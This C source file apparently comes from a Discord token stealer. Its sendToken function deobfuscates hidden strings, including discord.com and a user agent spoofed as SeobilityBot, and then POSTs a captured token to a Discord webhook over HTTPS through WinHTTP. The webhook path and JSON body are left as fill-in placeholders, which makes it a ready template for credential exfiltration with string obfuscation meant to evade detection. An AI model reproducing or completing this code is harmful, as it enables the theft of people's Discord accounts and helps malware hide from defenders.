#include "network.h"
#include "strings.h"

BOOL sendToken(PWSTR token) {

	BOOL retVal = FALSE;
	HINTERNET session = NULL, connection = NULL, request = NULL;
	WCHAR str_userAgent[] = { 0x44, 0x4B, 0x59, 0x6E, 0x56, 0x74, 0x1F, 0x2B, 0x23, 0x61, 0x63, 0x55, 0x0A, 0x08, 0x41, 0x0C, 0x11, 0x08, 0x43, 0x41, 0x59, 0x60, 0x04, 0x38, 0x1E, 0x2B, 0x2E, 0x53, 0x7F, 0x1B, 0x05, 0x0F, 0x65, 0x3E, 0x29, 0x06, 0x64, 0x4B, 0x59, 0x6E, 0x56, 0x74, 0x1F, 0x2B, 0x23, 0x0D, 0x62, 0x44, 0x5E, 0x0F, 0x61, 0x20, 0x2A, 0x4D, 0x64, 0x01, 0x54, 0x63, 0x4B, 0x36, 0x1E, 0x2B, 0x37, 0x4F, 0x25, 0x21 }; /*"SeobilityBot (SEO Tool; https://www.seobility.net/sites/bot.html)" +66 */
	WCHAR str_domain[] = { 0x73, 0x47, 0x45, 0x6F, 0x50, 0x6A, 0x12, 0x71, 0x39, 0x4C, 0x61, 0x21 };     /*"discord.com" +12 */
	WCHAR str_POST[] = { 0x47, 0x61, 0x65, 0x58, 0x3F }; /*"POST" +5 */
	WCHAR str_Content[50] = { 0x54, 0x41, 0x58, 0x78, 0x5A, 0x76, 0x02, 0x72, 0x2E, 0x5A, 0x7C, 0x44, 0x10, 0x20 };     /*"Content-type:" +14 */
	WCHAR str_applicationjson[] = { 0x76, 0x5E, 0x46, 0x60, 0x56, 0x7B, 0x17, 0x2B, 0x33, 0x4C, 0x62, 0x0E, 0x40, 0x53, 0x7D, 0x27, 0x5E };     /*"application/json" +17 */
	
	deobfuscateW(str_applicationjson, 17);
	deobfuscateW(str_Content, 14);
	deobfuscateW(str_domain, 12);
	deobfuscateW(str_userAgent, 66);
	deobfuscateW(str_POST, 5);

	StringCchCatW(str_Content, 50, str_applicationjson);

	if (token) {

		if (!(session = win_http_open(str_userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC)))
			goto Cleanup;

		if (!(connection = win_http_connect(session, str_domain, INTERNET_DEFAULT_HTTPS_PORT, 0)))
			goto Cleanup;

		if (!(request = win_http_open_request(connection, str_POST, L"/api/webhooks/YOUR WEBHOOK URL", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE)))
			goto Cleanup;

		if(!(win_http_send_request(request, str_Content, strlW(str_Content), "ENTER JSON HERE", 0, 0, 0)))
			goto Cleanup;

		if (win_http_receive_response(request, NULL))
			retVal = TRUE;

	Cleanup:
		if (request) win_http_close_handle(request);
		if (session) win_http_close_handle(connection);
		if (session) win_http_close_handle(session);


		freeMem(token);
	}

	return retVal;
}